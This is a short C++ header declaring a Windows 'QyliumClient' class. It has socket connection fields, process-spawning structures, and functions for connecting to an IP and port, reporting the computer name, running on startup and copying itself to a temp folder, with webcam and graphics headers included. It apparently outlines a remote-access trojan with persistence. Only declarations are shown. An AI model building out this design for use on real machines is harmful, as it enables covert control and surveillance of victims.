// client.h

#pragma once
#include <tchar.h>
#include <WinSock2.h>
#include <winsock.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <dshow.h>
#include <wingdi.h>
#include <stdio.h>
#include <iostream>
#include <strsafe.h>

bool isAdmin();
class Client 
{
public:
    WSADATA wsaData;
    WORD DllVersion;
    SOCKET wSock;
    SOCKET connection;
    SOCKADDR_IN addr;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    const char* czStartName = "QyliumClient";
    const char* executableName = "qylium.exe";

    // Connection
    int connect_to(short port, char *ip);

    // Other func
    void get_computer_name(SOCKET socket);
    void run_on_startup();
    void copy_to_temp();
};